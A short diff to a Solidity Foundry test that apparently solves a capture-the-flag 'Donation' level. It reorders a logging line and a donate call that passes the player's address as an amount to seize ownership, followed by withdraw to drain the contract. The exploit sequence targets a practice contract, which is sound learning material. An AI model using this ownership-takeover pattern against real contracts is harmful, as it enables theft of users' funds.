@@ -28,10 +28,9 @@ contract DonationTest is Test {
          *************** */
 
         uint256 scale = 10 ** 18 * 1 ether;
-        console.log(donation.owner());
         uint256 etherAmount = uint256(uint160(address(player)));
-        donation.donate{value: etherAmount / scale}(etherAmount);
         console.log(donation.owner());
+        donation.donate{value: etherAmount / scale}(etherAmount);
         donation.withdraw();
         /*****************
          *Level Submission*
